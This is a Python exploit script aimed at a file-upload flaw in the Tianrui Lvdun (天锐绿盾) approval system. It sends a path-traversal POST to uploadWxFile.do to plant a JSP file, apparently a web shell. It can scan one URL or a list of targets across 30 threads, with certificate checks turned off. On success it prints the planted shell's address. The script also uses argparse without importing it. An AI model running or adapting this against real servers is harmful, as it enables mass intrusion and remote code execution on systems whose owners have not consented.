# 天锐绿盾审批系统存在文件上传漏洞
from multiprocessing.dummy import Pool
import requests,warnings
import urllib3
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

def main():
    banner = """
              _____                    _____                   _______                   _____                    _____                   _______
         /\    \                  /\    \                 /::\    \                 /\    \                  /\    \                 /::\    \
        /::\____\                /::\    \               /::::\    \               /::\____\                /::\    \               /::::\    \
       /:::/    /               /::::\    \             /::::::\    \             /:::/    /               /::::\    \             /::::::\    \
      /:::/    /               /::::::\    \           /::::::::\    \           /:::/    /               /::::::\    \           /::::::::\    \
     /:::/    /               /:::/\:::\    \         /:::/~~\:::\    \         /:::/    /               /:::/\:::\    \         /:::/~~\:::\    \
    /:::/____/               /:::/__\:::\    \       /:::/    \:::\    \       /:::/____/               /:::/__\:::\    \       /:::/    \:::\    \
   /::::\    \              /::::\   \:::\    \     /:::/    / \:::\    \     /::::\    \              /::::\   \:::\    \     /:::/    / \:::\    \
  /::::::\    \   _____    /::::::\   \:::\    \   /:::/____/   \:::\____\   /::::::\    \   _____    /::::::\   \:::\    \   /:::/____/   \:::\____\
 /:::/\:::\    \ /\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    | /:::/\:::\    \ /\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    |
/:::/  \:::\    /::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |/:::/  \:::\    /::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |
\::/    \:::\  /:::/    /\::/    \:::\  /:::/    / \:::\    \   /:::/    / \::/    \:::\  /:::/    /\::/    \:::\  /:::/    / \:::\    \   /:::/    /
 \/____/ \:::\/:::/    /  \/____/ \:::\/:::/    /   \:::\    \ /:::/    /   \/____/ \:::\/:::/    /  \/____/ \:::\/:::/    /   \:::\    \ /:::/    /
          \::::::/    /            \::::::/    /     \:::\    /:::/    /             \::::::/    /            \::::::/    /     \:::\    /:::/    /
           \::::/    /              \::::/    /       \:::\__/:::/    /               \::::/    /              \::::/    /       \:::\__/:::/    /
           /:::/    /               /:::/    /         \::::::::/    /                /:::/    /               /:::/    /         \::::::::/    /
          /:::/    /               /:::/    /           \::::::/    /                /:::/    /               /:::/    /           \::::::/    /
         /:::/    /               /:::/    /             \::::/    /                /:::/    /               /:::/    /             \::::/    /
        /:::/    /               /:::/    /               \::/____/                /:::/    /               /:::/    /               \::/____/
        \::/    /                \::/    /                 ~~                      \::/    /                \::/    /                 ~~
         \/____/                  \/____/                                           \/____/                  \/____/
        """
    print(banner)
    parse = argparse.ArgumentParser(description="漏洞描述")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='输入文件')
    args = parse.parse_args()
    urls=[]
    if args.url:
        check(updata(args.url))
    elif args.file:
        with open(args.file,"r+") as f:
            for i in f:
                domain=i.strip()
                urls.append(updata(domain))
        pool=Pool(30)
        pool.map(check,urls)
    else:
        print("输入参数")

def updata(url):
    if "http" in url:
        return url
    else:
        return f"http://{url}"

def check(domain):
    url=f"{domain}/trwfe/service/.%2E/config/uploadWxFile.do"
    with open("hao.jsp","r") as f:
        files={
            'file':('ac.jsp',f,'application/octet-stream')
        }
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Connection': 'close',
        }
        try:
            response=requests.post(url=url,headers=headers,files=files, timeout=3,verify=False)
            if (response.status_code==200) and ("true" in response.text):
                print(f"[+]存在漏洞，上传成功{domain}/ac.jsp")
            else:
                print(f"[-]不存在漏洞")
        except Exception as e:
            print("网站错误")
if __name__ == '__main__':
    main()